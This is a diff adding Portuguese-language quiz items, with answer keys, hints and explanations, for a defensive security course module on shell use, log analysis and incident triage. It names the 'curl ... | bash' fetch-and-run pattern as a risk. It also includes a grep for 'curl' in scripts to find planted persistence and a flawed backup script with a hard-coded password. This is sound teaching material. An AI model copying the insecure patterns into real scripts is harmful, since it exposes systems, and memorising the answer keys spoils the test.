+        "Grava as mensagens de erro em um arquivo chamado null",
+        "Encerra o comando assim que o primeiro erro ocorrer"
+      ],
+      "correta": 0,
+      "dicas": [
+        "O 2 identifica qual fluxo está sendo redirecionado.",
+        "/dev/null é um destino especial que descarta tudo que recebe.",
+        "O resultado normal continua no caminho de sempre."
+      ],
+      "pergunta_socratica": "Antes de conferir: ao rodar find na raiz como usuário comum, o que polui a tela e atrapalha a leitura?",
+      "explicacao": "O descritor 2 é a saída de erro, e /dev/null descarta tudo que recebe. A combinação limpa a tela de mensagens irrelevantes — é o que torna legível um find na raiz do sistema, que gera dezenas de avisos de permissão negada. O resultado útil continua saindo normalmente. Vale lembrar que descartar erro também esconde problema real, então em script vale registrar em vez de descartar.",
+      "por_que_erradas": {
+        "1": "É o inverso: o erro é descartado, e o resultado permanece.",
+        "2": "/dev/null é um dispositivo especial, não um arquivo comum criado no diretório.",
+        "3": "O comando continua executando normalmente após um erro."
+      },
+      "fonte": "POSIX shell",
+      "tags": ["shell", "redirecionamento", "comando", "fundamentos"]
+    },
+    {
+      "id": "1.2.q18",
+      "tipo": "caca_erro",
+      "dificuldade": 3,
+      "objetivos": [0, 3],
+      "trecho": "#!/bin/bash\n# backup diário do banco\nDESTINO=/backup/db.sql\nmysqldump -u root -pSenha123 aplicacao > $DESTINO\necho \"backup concluído\" >> /var/log/backup.log",
+      "enunciado": "Além da senha em texto claro na linha de comando, qual falha deste script tem maior chance de causar perda de dados?",
+      "alternativas": [
+        "O destino é sempre o mesmo arquivo e a saída de erro não é capturada: uma falha do mysqldump sobrescreve o backup anterior com um arquivo vazio, e o log registra sucesso mesmo assim",
+        "A variável DESTINO deveria estar entre aspas duplas para funcionar",
+        "O script não define permissões no arquivo de backup",
+        "O uso de >> no log fará o arquivo crescer indefinidamente"
+      ],
+      "correta": 0,
+      "dicas": [
+        "O que o operador > faz com o arquivo antes de escrever nele?",
+        "Se o mysqldump falhar, o que sobra em /backup/db.sql?",
+        "A mensagem de sucesso é registrada com base em quê?"
+      ],
+      "pergunta_socratica": "Antes de conferir: o comando falhou e o script continuou. O que aconteceu com o backup de ontem?",
+      "explicacao": "O operador > trunca o arquivo antes de o mysqldump escrever qualquer coisa. Se o comando falhar, o backup anterior já foi destruído e sobra um arquivo vazio — e a linha seguinte registra sucesso incondicionalmente, porque o script não verifica o código de retorno. O conserto envolve nome com data, verificação do código de saída antes de declarar sucesso, e captura do erro. A senha na linha de comando é grave e aparece na lista de processos, mas não destrói o backup.",
+      "por_que_erradas": {
+        "1": "Aspas são boa prática para caminhos com espaço, mas o caminho aqui não tem espaço.",
+        "2": "Permissão do arquivo é problema de confidencialidade, não de perda de dados.",
+        "3": "Crescimento do log é questão de rotação, com impacto muito menor."
+      },
+      "fonte": "POSIX shell; teoria 1.2.t1",
+      "tags": ["shell", "script", "caca-erro", "backup", "redirecionamento"]
+    },
+    {
+      "id": "1.2.q19",
+      "tipo": "comando",
+      "dificuldade": 2,
+      "objetivos": [1],
+      "enunciado": "Qual comando substitui todas as ocorrências de \"192.168.1.1\" por \"REDIGIDO\" em um arquivo, exibindo o resultado sem alterar o original?",
+      "alternativas": [
+        "sed 's/192\\.168\\.1\\.1/REDIGIDO/g' relatorio.txt",
+        "sed -i 's/192.168.1.1/REDIGIDO/g' relatorio.txt",
+        "grep -r \"192.168.1.1\" relatorio.txt",
+        "awk '{gsub(REDIGIDO)}' relatorio.txt"
+      ],
+      "correta": 0,
+      "dicas": [
+        "A opção -i altera o arquivo no lugar — e o enunciado pede o contrário.",
+        "O g no fim da expressão indica todas as ocorrências da linha.",
+        "grep encontra, mas não substitui."
+      ],
+      "pergunta_socratica": "Antes de conferir: qual dessas opções modifica o arquivo original, e você quer isso?",
+      "explicacao": "sed com s/padrão/troca/g substitui todas as ocorrências de cada linha e envia o resultado para a saída padrão, preservando o arquivo. A opção -i faria a alteração no próprio arquivo, que não é o pedido. As barras invertidas antes dos pontos os tratam como caractere literal, e não como o coringa da expressão regular. grep não substitui, e a sintaxe do awk apresentada é inválida.",
+      "por_que_erradas": {
+        "1": "-i altera o arquivo original, ao contrário do que o enunciado pede.",
+        "2": "grep localiza ocorrências, sem substituir.",
+        "3": "A chamada a gsub está incompleta e a sintaxe é inválida."
+      },
+      "fonte": "POSIX sed",
+      "tags": ["shell", "sed", "comando", "anonimizacao"]
+    },
+    {
+      "id": "1.2.q20",
+      "tipo": "conceitual",
+      "dificuldade": 3,
+      "objetivos": [0, 3],
+      "enunciado": "Por que passar uma senha como argumento na linha de comando é considerado inseguro?",
+      "alternativas": [
+        "O argumento fica visível na lista de processos para outros usuários da máquina e costuma ir para o histórico do shell",
+        "O shell transmite argumentos sem cifra pela rede antes de executá-los",
+        "Senhas em argumento são automaticamente registradas pelo sistema em /etc/shadow",
+        "O sistema converte argumentos para maiúsculas, alterando a senha"
+      ],
+      "correta": 0,
+      "dicas": [
+        "O que ps aux mostra além do nome do programa?",
+        "Onde ficam registrados os comandos que você digitou?",
+        "Duas alternativas descrevem comportamentos que não existem."
+      ],
+      "pergunta_socratica": "Antes de conferir: outro usuário logado nessa máquina consegue ver o comando que você está executando?",
+      "explicacao": "A linha de comando de um processo é visível na tabela de processos, então qualquer usuário da máquina pode ler a senha enquanto o comando roda, e o comando ainda fica gravado no histórico do shell. As alternativas seguras são variável de ambiente com cuidado, arquivo de configuração com permissão restrita, ou o mecanismo de credenciais da própria ferramenta.",
+      "por_que_erradas": {
+        "1": "Não há transmissão de argumentos pela rede na execução local.",
+        "2": "/etc/shadow guarda hashes de contas do sistema, e não argumentos executados.",
+        "3": "Argumentos não são convertidos para maiúsculas."
+      },
+      "fonte": "Security Engineering, 3ª ed., cap. 6; teoria 1.1.t5",
+      "tags": ["shell", "segredos", "processos", "boas-praticas"]
+    },
+    {
+      "id": "1.2.q21",
+      "tipo": "comando",
+      "dificuldade": 3,
+      "objetivos": [1],
+      "enunciado": "Qual cadeia extrai os endereços IP de tentativas malsucedidas e mostra os cinco que mais tentaram?",
+      "alternativas": [
+        "grep \"Failed password\" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -n 5",
+        "grep \"Failed password\" auth.log | head -n 5 | sort | uniq -c",
+        "grep -c \"Failed password\" auth.log | sort -rn | head -n 5",
+        "awk '{print $(NF-3)}' auth.log | grep \"Failed password\" | uniq -c"
+      ],
+      "correta": 0,
+      "dicas": [
+        "A ordem das etapas importa: filtrar, extrair, agrupar, contar, ordenar, cortar.",
+        "head no meio da cadeia corta antes da contagem, e não depois.",
+        "grep -c devolve um único número, que não tem o que ordenar."
+      ],
+      "pergunta_socratica": "Antes de conferir: se você cortar as cinco primeiras linhas antes de contar, o que exatamente terá contado?",
+      "explicacao": "A cadeia correta filtra as linhas de falha, extrai o endereço ancorando pelo fim da linha, agrupa com sort, conta com uniq -c, ordena pela contagem e só então corta os cinco primeiros. Colocar o head antes da contagem responde outra pergunta: as cinco primeiras ocorrências, e não os cinco endereços mais frequentes. E extrair antes de filtrar destrói o texto que o grep precisaria encontrar.",
+      "por_que_erradas": {
+        "1": "O head no meio corta antes da contagem, mudando completamente o resultado.",
+        "2": "grep -c devolve um único número; não há lista para ordenar.",
+        "3": "A extração acontece antes do filtro, então o grep não encontra mais o texto procurado."
+      },
+      "fonte": "POSIX; cadeia verificada em amostra de auth.log",
+      "tags": ["shell", "pipes", "comando", "analise-de-log", "forca-bruta"]
+    },
+    {
+      "id": "1.2.q22",
+      "tipo": "cenario",
+      "dificuldade": 2,
+      "objetivos": [2],
+      "enunciado": "Você suspeita que um invasor deixou arquivos em um servidor há três dias. Qual busca ajuda mais na triagem?",
+      "alternativas": [
+        "Listar arquivos modificados nos últimos três dias em diretórios graváveis, como /tmp, /var/tmp e /dev/shm",
+        "Listar todos os arquivos do sistema ordenados por tamanho",
+        "Procurar arquivos com extensão .exe em todo o sistema",
+        "Listar os arquivos com data de criação anterior à instalação do sistema"
+      ],
+      "correta": 0,
+      "dicas": [
+        "Você tem uma janela de tempo e sabe onde um usuário sem privilégio consegue gravar.",
+        "Tamanho não indica intenção.",
+        "Qual extensão um binário costuma ter em Linux?"
+      ],
+      "pergunta_socratica": "Antes de conferir: onde um processo comprometido sem privilégio consegue gravar nesta máquina?",
+      "explicacao": "Combinar janela de tempo com diretórios graváveis por todos é o que estreita a busca a um conjunto pequeno e relevante. Tamanho não diz nada sobre intenção, extensão .exe não é padrão em Linux — binários costumam não ter extensão — e arquivos anteriores à instalação são ruído. A triagem eficiente sempre cruza dois critérios: quando e onde.",
+      "por_que_erradas": {
+        "1": "Tamanho não é indicador de comprometimento.",
+        "2": "Executáveis em Linux normalmente não têm extensão.",
+        "3": "Datas anteriores à instalação não têm relação com a janela do incidente."
+      },
+      "fonte": "NIST SP 800-61; teoria 1.2.t5",
+      "tags": ["shell", "find", "investigacao", "triagem"]
+    },
+    {
+      "id": "1.2.q23",
+      "tipo": "conceitual",
+      "dificuldade": 2,
+      "objetivos": [1],
+      "enunciado": "Por que `uniq` precisa de uma entrada ordenada para funcionar como se espera?",
+      "alternativas": [
+        "Porque ele compara apenas linhas adjacentes: repetições separadas por outras linhas não são agrupadas",
+        "Porque ele exige entrada em ordem alfabética para calcular a contagem corretamente",
+        "Porque ele lê o arquivo inteiro na memória e a ordenação reduz o consumo",
+        "Porque sem ordenação ele descarta a primeira ocorrência de cada valor"
+      ],
+      "correta": 0,
+      "dicas": [
+        "Pense em uma lista com A, B, A. O que uniq faz com ela?",
+        "A comparação é feita entre a linha atual e a anterior.",
+        "Não é uma exigência de alfabeto, e sim de vizinhança."
+      ],
+      "pergunta_socratica": "Antes de conferir: em A, B, A, quantos grupos o uniq enxerga?",
+      "explicacao": "uniq compara cada linha com a anterior, então só agrupa repetições vizinhas. Em A, B, A ele enxerga três grupos, porque os dois A não estão juntos. Ordenar antes coloca as iguais lado a lado, e é por isso que a cadeia canônica é sort | uniq -c. A ordem não precisa ser alfabética em si: precisa apenas agrupar as iguais.",
+      "por_que_erradas": {
+        "1": "A ordem alfabética é apenas um efeito do sort; o requisito real é adjacência.",
+        "2": "uniq processa em fluxo, sem carregar o arquivo inteiro.",
+        "3": "uniq não descarta a primeira ocorrência; ele conta grupos adjacentes."
+      },
+      "fonte": "POSIX uniq; comportamento verificado em execução",
+      "tags": ["shell", "uniq", "pipes", "analise-de-log"]
+    },
+    {
+      "id": "1.2.q24",
+      "tipo": "ataque_defesa",
+      "dificuldade": 3,
+      "objetivos": [3],
+      "enunciado": "Uma equipe quer detectar rapidamente a criação de tarefas agendadas não autorizadas em servidores. Qual medida é a mais eficaz?",
+      "alternativas": [
+        "Monitorar alterações nos arquivos e diretórios de cron e nos timers do systemd, com alerta para toda mudança",
+        "Revisar manualmente as tarefas agendadas a cada seis meses",
+        "Bloquear o uso do comando crontab para todos os usuários do sistema",
+        "Aumentar o nível de detalhe dos registros do servidor web"
+      ],
+      "correta": 0,
+      "dicas": [
+        "Persistência por agendamento é criada uma vez e dura meses.",
+        "Revisão semestral descobre em quanto tempo, no pior caso?",
+        "Bloquear a ferramenta impede a criação por outros caminhos?"
+      ],
+      "pergunta_socratica": "Antes de conferir: entre a criação da tarefa e a sua descoberta, quanto tempo você aceita?",
+      "explicacao": "Alerta sobre mudança nos arquivos de agendamento reduz a janela de descoberta de meses para minutos, que é o que importa contra persistência. Revisão semestral pode deixar um acesso ativo por todo esse tempo. Bloquear o comando crontab não impede a escrita direta nos arquivos nem o uso de timers do systemd, e registro do servidor web trata de outro vetor.",
+      "por_que_erradas": {
+        "1": "Semestral é uma janela longa demais para persistência que age diariamente.",
+        "2": "Bloquear a ferramenta não impede a criação da tarefa por outros meios.",
+        "3": "Registro do servidor web não cobre criação de tarefa agendada."
+      },
+      "fonte": "MITRE ATT&CK (persistência); NIST Cybersecurity Framework (detectar)",
+      "tags": ["shell", "cron", "deteccao", "persistencia", "monitoramento"]
+    },
+    {
+      "id": "1.2.q25",
+      "tipo": "ordenacao",
+      "dificuldade": 2,
+      "objetivos": [1],
+      "enunciado": "Coloque as etapas de uma análise de log na ordem em que compõem a cadeia de comandos.",
+      "itens": [
+        "Filtrar as linhas de interesse com grep",
+        "Extrair o campo relevante de cada linha com awk",
+        "Ordenar a saída para agrupar valores iguais",
+        "Contar as repetições de cada valor com uniq -c",
+        "Ordenar pela contagem, do maior para o menor"
+      ],
+      "ordem_correta": [0, 1, 2, 3, 4],
+      "dicas": [
+        "A extração pressupõe que o texto procurado ainda esteja presente.",
+        "uniq só agrupa o que estiver adjacente.",
+        "A ordenação por contagem só faz sentido depois que a contagem existe."
+      ],
+      "pergunta_socratica": "Antes de conferir: o que aconteceria se você extraísse o campo antes de filtrar as linhas?",
+      "explicacao": "A cadeia segue uma dependência estrita: filtrar antes de extrair, porque a extração descarta o texto que o filtro usaria; ordenar antes de contar, porque uniq só agrupa vizinhos; e ordenar pela contagem no fim, quando ela já existe. Trocar qualquer par de etapas produz um resultado que parece plausível e responde outra pergunta — que é o modo mais fácil de errar em análise de log.",
+      "fonte": "POSIX; cadeia verificada em execução",
+      "tags": ["shell", "pipes", "analise-de-log", "ciclo"]
+    },
+    {
+      "id": "1.2.q26",
+      "tipo": "conceitual",
+      "dificuldade": 2,
+      "objetivos": [3],
+      "enunciado": "Por que baixar um script da internet e executá-lo diretamente com `curl ... | bash` é uma prática arriscada?",
+      "alternativas": [
+        "O conteúdo é executado sem ser inspecionado, e o servidor pode entregar código diferente a cada requisição",
+        "O comando curl não valida certificados, então a conexão é sempre em texto claro",
+        "O bash não consegue executar scripts recebidos por entrada padrão, o que corrompe o sistema",
+        "A prática é segura desde que o endereço use HTTPS"
+      ],
+      "correta": 0,
+      "dicas": [
+        "Você leu o que está sendo executado?",
+        "O servidor sabe distinguir quem está apenas baixando de quem está executando.",
+        "HTTPS garante o transporte; garante o conteúdo?"
+      ],
+      "pergunta_socratica": "Antes de conferir: o que impede o servidor de entregar um conteúdo para você ler e outro para você executar?",
+      "explicacao": "O código roda sem nenhuma inspeção, e quem controla o servidor decide o que entregar em cada requisição — inclusive conteúdo diferente conforme o cliente. HTTPS protege o transporte e autentica o servidor, mas não diz nada sobre a intenção de quem está do outro lado. A prática segura é baixar, ler e só então executar, de preferência com verificação de integridade.",
+      "por_que_erradas": {
+        "1": "curl valida certificados por padrão em HTTPS; o problema é outro.",
+        "2": "bash executa normalmente scripts vindos da entrada padrão.",
+        "3": "HTTPS protege o transporte, e não a confiabilidade do conteúdo entregue."
+      },
+      "fonte": "MITRE ATT&CK (execução); teoria 0.2.t6",
+      "tags": ["shell", "cadeia-de-fornecimento", "execucao", "boas-praticas"]
+    },
+    {
+      "id": "1.2.q27",
+      "tipo": "artefato",
+      "dificuldade": 3,
+      "objetivos": [1],
+      "artefato": "$ grep \"Failed password\" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn\n      3 203.0.113.45\n      1 198.51.100.7",
+      "enunciado": "O que esta saída indica, e qual é o próximo passo mais útil?",
+      "alternativas": [
+        "Um endereço concentra três das quatro falhas; o próximo passo é verificar se houve login bem-sucedido a partir dele",
+        "Houve exatamente quatro usuários diferentes tentando autenticar, e o próximo passo é bloquear todos",
+        "O servidor está sob ataque de negação de serviço, e o próximo passo é aumentar a capacidade",
+        "Os dois endereços são internos, e o próximo passo é revisar a configuração do DHCP"
+      ],
+      "correta": 0,
+      "dicas": [
+        "A primeira coluna é a contagem, e a segunda é o valor contado.",
+        "Falha repetida importa; o que importa mais é o que veio depois dela.",
+        "Verifique se algum desses endereços aparece em uma linha de sucesso."
+      ],
+      "pergunta_socratica": "Antes de conferir: quatro falhas são preocupantes por si só, ou o que preocupa é o que aconteceu em seguida?",
+      "explicacao": "A saída mostra concentração: um endereço responde por três das quatro falhas. O número absoluto é pequeno e, sozinho, diria pouco — tentativas malsucedidas são ruído constante na internet. O que decide a gravidade é a linha seguinte da história: procurar \"Accepted\" vindo do mesmo endereço, e depois verificar o que a sessão fez. Os endereços do exemplo pertencem a faixas de documentação, não a redes internas.",
+      "por_que_erradas": {
+        "1": "A contagem é por endereço de origem, não por usuário, e bloqueio em massa não é a primeira ação.",
+        "2": "Quatro tentativas de autenticação não caracterizam negação de serviço.",
+        "3": "203.0.113.0/24 e 198.51.100.0/24 são faixas reservadas a documentação, não internas."
+      },
+      "fonte": "RFC 5737 (faixas para documentação); MITRE ATT&CK",
+      "tags": ["shell", "artefato", "analise-de-log", "forca-bruta", "triagem"]
+    },
+    {
+      "id": "1.2.q28",
+      "tipo": "comando",
+      "dificuldade": 2,
+      "objetivos": [0],
+      "enunciado": "O que o comando `history` revela, e por que isso importa em uma investigação?",
+      "alternativas": [
+        "Os comandos digitados pelo usuário naquele shell, o que ajuda a reconstruir o que foi feito na máquina",
+        "Todos os comandos executados por todos os usuários do sistema, com data e hora",
+        "O histórico de acessos por rede ao servidor, com endereço de origem",
+        "As alterações feitas nos arquivos de configuração do sistema"
+      ],
+      "correta": 0,
+      "dicas": [
+        "O histórico pertence ao shell de um usuário, e não ao sistema inteiro.",
+        "Pense em quem consegue apagar esse arquivo.",
+        "Acesso por rede fica registrado em outro lugar."
+      ],
+      "pergunta_socratica": "Antes de conferir: se o invasor usou a conta de um usuário, o histórico dele conta parte da história?",
+      "explicacao": "history mostra os comandos daquele usuário, gravados em um arquivo no diretório pessoal dele. É fonte valiosa para reconstruir ações, e por isso mesmo é um dos primeiros alvos de quem quer apagar rastros — histórico vazio ou desabilitado, em conta que foi usada, é achado por si só. Acessos por rede ficam em auth.log, e alterações de configuração exigem monitoramento próprio.",
+      "por_que_erradas": {
+        "1": "O histórico é por usuário e por shell, não global.",
+        "2": "Acessos por rede ficam nos registros de autenticação.",
+        "3": "Alterações de configuração exigem monitoramento de integridade de arquivos."
+      },
+      "fonte": "MITRE ATT&CK (ocultação de rastros); NIST SP 800-61",
+      "tags": ["shell", "historico", "forense", "investigacao"]
+    },
+    {
+      "id": "1.2.q29",
+      "tipo": "cenario",
+      "dificuldade": 3,
+      "objetivos": [0, 3],
+      "enunciado": "Um script de manutenção roda por cron e apaga arquivos antigos. Ele funciona quando executado à mão, mas falha quando agendado. Qual é a causa mais provável?",
+      "alternativas": [
+        "O ambiente do cron é reduzido: variáveis como PATH podem não estar definidas, e comandos chamados sem caminho absoluto não são encontrados",
+        "O cron não permite a execução de comandos que apagam arquivos",
+        "O script precisa de permissão 777 para ser executado pelo cron",
+        "O cron só executa scripts escritos em Python"
+      ],
+      "correta": 0,
+      "dicas": [
+        "O que muda entre o seu shell interativo e o ambiente em que o cron executa?",
+        "Pense nas variáveis de ambiente que o seu perfil define ao fazer login.",
+        "A correção usual é usar caminhos absolutos ou definir PATH no topo do script."
+      ],
+      "pergunta_socratica": "Antes de conferir: o cron carrega o seu arquivo de perfil antes de executar a tarefa?",
+      "explicacao": "O cron executa com um ambiente mínimo, sem carregar o perfil do usuário: PATH costuma ser curto e variáveis definidas no login não existem. Comandos chamados pelo nome podem não ser encontrados, e o script falha em silêncio. A correção é usar caminhos absolutos, definir PATH no início do script e redirecionar a saída para um log — sem isso, o erro se perde. Permissão 777 nunca é a resposta.",
+      "por_que_erradas": {
+        "1": "cron executa qualquer comando que o usuário poderia executar, inclusive remoções.",
+        "2": "777 é permissão excessiva e não tem relação com a falha.",
+        "3": "cron executa qualquer programa, independentemente da linguagem."
+      },
+      "fonte": "crontab(5); teoria 1.2.t6",
+      "tags": ["shell", "cron", "diagnostico", "automacao"]
+    },
+    {
+      "id": "1.2.q30",
+      "tipo": "conceitual",
+      "dificuldade": 2,
+      "objetivos": [2],
+      "enunciado": "Qual é a diferença entre `find /var -name \"*.conf\"` e `find /var -iname \"*.conf\"`?",
+      "alternativas": [
+        "-iname ignora a diferença entre maiúsculas e minúsculas no nome do arquivo",
+        "-iname procura apenas dentro de diretórios ocultos",
+        "-iname busca pelo conteúdo do arquivo, e não pelo nome",
+        "-iname limita a busca ao primeiro nível de diretórios"
+      ],
+      "correta": 0,
+      "dicas": [
+        "O i inicial aparece em outras ferramentas com o mesmo sentido.",
+        "Pense em um arquivo chamado Config.CONF.",
+        "Buscar por conteúdo é trabalho do grep."
+      ],
+      "pergunta_socratica": "Antes de conferir: um arquivo chamado APP.CONF apareceria na primeira busca?",
+      "explicacao": "-iname faz a comparação sem diferenciar maiúsculas de minúsculas, assim como o -i do grep. Em sistemas com arquivos vindos de várias origens, isso evita perder achados por diferença de capitalização — detalhe que importa em investigação, onde um arquivo não encontrado é lido como arquivo inexistente. Busca por conteúdo é grep, e limitar profundidade é -maxdepth.",
+      "por_que_erradas": {
+        "1": "Diretórios ocultos são percorridos normalmente por ambas as formas.",
+        "2": "Busca por conteúdo é feita com grep.",
+        "3": "Limitar profundidade é papel da opção -maxdepth."
+      },
+      "fonte": "POSIX find",
+      "tags": ["shell", "find", "comando", "investigacao"]
+    },
+    {
+      "id": "1.2.q31",
+      "tipo": "ataque_defesa",
+      "dificuldade": 3,
+      "objetivos": [1, 0],
+      "enunciado": "Uma equipe quer garantir que a análise de logs continue possível mesmo quando o volume cresce muito. Qual prática ajuda mais?",
+      "alternativas": [
+        "Padronizar o formato dos registros, com campos em posição previsível ou estruturados, para que a extração não dependa de contar palavras",
+        "Reduzir o nível de detalhe dos registros para diminuir o volume",
+        "Compactar os logs diariamente para economizar espaço em disco",
+        "Manter os logs apenas nos servidores de origem, evitando duplicação"
+      ],
+      "correta": 0,
+      "dicas": [
+        "Lembre do problema do campo de posição fixa quando o formato varia.",
+        "Reduzir detalhe resolve volume, mas perde o quê?",
+        "Compactar ajuda em disco; ajuda em análise?"
+      ],
+      "pergunta_socratica": "Antes de conferir: o que torna uma cadeia de análise frágil quando o log cresce e ganha variações?",
+      "explicacao": "Formato previsível é o que permite automatizar extração com confiança — sem ele, cada variação de linha vira um erro silencioso, como o campo que ora traz endereço, ora traz nome de usuário. Reduzir detalhe corta justamente a informação necessária à investigação, compactar trata de espaço e manter os logs só na origem contraria a proteção contra apagamento por quem comprometeu a máquina.",
+      "por_que_erradas": {
+        "1": "Menos detalhe reduz volume e também a capacidade de investigar.",
+        "2": "Compactação trata de armazenamento, não de facilidade de análise.",
+        "3": "Manter apenas na origem deixa o registro ao alcance de quem comprometeu o servidor."
+      },
+      "fonte": "NIST SP 800-61; teoria 1.2.t4",
+      "tags": ["shell", "logs", "padronizacao", "monitoramento"]
+    },
+    {
+      "id": "1.2.q32",
+      "tipo": "comando",
+      "dificuldade": 3,
+      "objetivos": [0, 2],
+      "enunciado": "O que faz `find /home -type f -name \"*.sh\" -exec grep -l \"curl\" {} \\;`?",
+      "alternativas": [
+        "Lista os scripts .sh em /home que contêm a palavra curl",
+        "Remove todos os scripts .sh que contêm a palavra curl",
+        "Substitui a palavra curl por outra em todos os scripts encontrados",
+        "Executa todos os scripts .sh encontrados em /home"
+      ],
+      "correta": 0,
+      "dicas": [
+        "-exec aplica um comando a cada arquivo encontrado, e {} é o lugar do nome.",
+        "A opção -l do grep muda o que ele imprime.",
+        "Nada nesse comando altera ou executa os arquivos."
+      ],
+      "pergunta_socratica": "Antes de conferir: o grep -l imprime as linhas encontradas ou o nome do arquivo?",
+      "explicacao": "find localiza os scripts, -exec roda o grep em cada um e {} é substituído pelo caminho do arquivo. A opção -l faz o grep imprimir apenas o nome dos arquivos que contêm o padrão, em vez das linhas. É uma busca útil em triagem: encontrar scripts que fazem download, o que costuma indicar automação legítima — ou persistência plantada.",
+      "por_que_erradas": {
+        "1": "Remover exigiria rm ou -delete; o comando apenas lista.",
+        "2": "Substituição seria feita com sed.",
+        "3": "Os scripts não são executados; eles são lidos pelo grep."
+      },
+      "fonte": "POSIX find e grep",
+      "tags": ["shell", "find", "grep", "comando", "triagem"]
+    },
+    {
+      "id": "1.2.q33",
+      "tipo": "pareamento",
+      "dificuldade": 2,
+      "objetivos": [0],
+      "enunciado": "Ligue cada construção de redirecionamento ao seu efeito.",
+      "pares": [
+        ["> arquivo", "Envia a saída padrão para o arquivo, apagando o conteúdo anterior"],
+        [">> arquivo", "Acrescenta a saída padrão ao final do arquivo"],
+        ["2> arquivo", "Envia apenas a saída de erro para o arquivo"],
+        ["2>/dev/null", "Descarta as mensagens de erro"],
+        ["> arquivo 2>&1", "Envia saída padrão e saída de erro para o mesmo arquivo"]
+      ],
+      "dicas": [
+        "O número 2 identifica o fluxo de erro.",
+        "Dois deles gravam a saída normal, e a diferença está em apagar ou acrescentar.",
+        "/dev/null é um destino que descarta tudo."
+      ],
+      "pergunta_socratica": "Antes de conferir: qual dessas construções você usaria em um script que precisa registrar erros?",
+      "explicacao": "As cinco formas cobrem quase todo uso diário: sobrescrever, acrescentar, separar o erro, descartar o erro e juntar os dois no mesmo destino. Em script de produção, a combinação útil costuma ser gravar tudo em log com > arquivo 2>&1, porque descartar erro esconde a falha que você vai precisar investigar depois.",
+      "fonte": "POSIX shell; teoria 1.2.t1",
+      "tags": ["shell", "redirecionamento", "pareamento", "fundamentos"]
+    },
+    {
+      "id": "1.2.q34",
+      "tipo": "cenario",
+      "dificuldade": 3,
+      "objetivos": [1, 2],
+      "enunciado": "Você recebeu 4 GB de logs de um servidor comprometido e tem uma janela suspeita de duas horas. Como reduzir isso a algo analisável?",
+      "alternativas": [
+        "Recortar primeiro pela janela de tempo, depois filtrar por indicadores conhecidos, e só então extrair e contar campos",
+        "Abrir os arquivos em um editor de texto e ler sequencialmente do início",
+        "Extrair todos os campos de todas as linhas e depois procurar padrões na saída",
+        "Compactar os arquivos e analisar apenas o que couber na memória disponível"
+      ],
+      "correta": 0,
+      "dicas": [
+        "Qual filtro elimina mais linhas com menos esforço?",
+        "Extrair antes de filtrar multiplica o trabalho por milhões de linhas.",
+        "A ordem das etapas define se a análise é viável."
+      ],
+      "pergunta_socratica": "Antes de conferir: qual recorte reduz 4 GB à menor quantidade de dados de uma vez só?",
+      "explicacao": "Tempo é o filtro mais barato e mais eficaz: duas horas de uma janela reduzem o volume em ordens de grandeza antes de qualquer processamento pesado. Depois entram os indicadores conhecidos — endereço, usuário, nome de arquivo — e só então a extração e a contagem. Inverter isso processa milhões de linhas irrelevantes, e ler sequencialmente não escala em nenhum cenário real.",
+      "por_que_erradas": {
+        "1": "Leitura sequencial de gigabytes não é viável no tempo de uma resposta a incidente.",
+        "2": "Extrair antes de filtrar processa tudo, inclusive o que seria descartado.",
+        "3": "Compactar reduz espaço em disco, e não a quantidade de linhas a analisar."
+      },
+      "fonte": "NIST SP 800-61; teoria 1.2.t2",
+      "tags": ["shell", "analise-de-log", "triagem", "resposta-a-incidentes"]
+    },
+    {
+      "id": "1.2.q35",
+      "tipo": "cenario",
+      "dificuldade": 3,
+      "objetivos": [0, 1, 2, 3],
+      "enunciado": "Você precisa escrever um script que roda diariamente e alerta quando um endereço acumula mais de 50 falhas de autenticação em um dia. Quais cuidados de projeto são os mais importantes?",
+      "alternativas": [
+        "Ancorar a extração de campos de forma resistente a variações de formato, registrar saída e erro em log, usar caminhos absolutos por causa do cron, e verificar o código de retorno antes de declarar sucesso",
+        "Rodar o script como root para garantir acesso a todos os arquivos de log",
+        "Manter o script curto, em uma única linha, para facilitar a manutenção",
+        "Descartar a saída de erro com 2>/dev/null, para que o log fique limpo"
+      ],
+      "correta": 0,
+      "dicas": [
+        "Lembre do campo que muda de posição conforme a linha do log.",
+        "O ambiente do cron é diferente do seu shell interativo.",
+        "Descartar erro deixa o log limpo — e você cego."
+      ],
+      "pergunta_socratica": "Antes de conferir: daqui a seis meses, como você vai descobrir que esse script parou de funcionar?",
+      "explicacao": "Os quatro cuidados atacam as formas conhecidas de esse script falhar em silêncio: extração frágil que passa a contar a coisa errada quando o formato varia, ambiente reduzido do cron que não encontra os comandos, ausência de log que esconde a falha, e sucesso declarado sem verificar o retorno. Rodar como root é privilégio desnecessário, uma única linha piora a manutenção, e descartar o erro é justamente o que impede descobrir que o alerta parou de funcionar.",
+      "por_que_erradas": {
+        "1": "Leitura de log costuma exigir apenas o grupo adequado; root é privilégio excessivo.",
+        "2": "Script de uma linha dificulta manutenção e depuração.",
+        "3": "Descartar a saída de erro é o caminho mais rápido para uma falha silenciosa."
+      },
+      "fonte": "crontab(5); POSIX shell; teoria 1.2.t1 e 1.2.t6",
+      "tags": ["shell", "script", "cron", "automacao", "boas-praticas"]
+    }
+  ]
+}
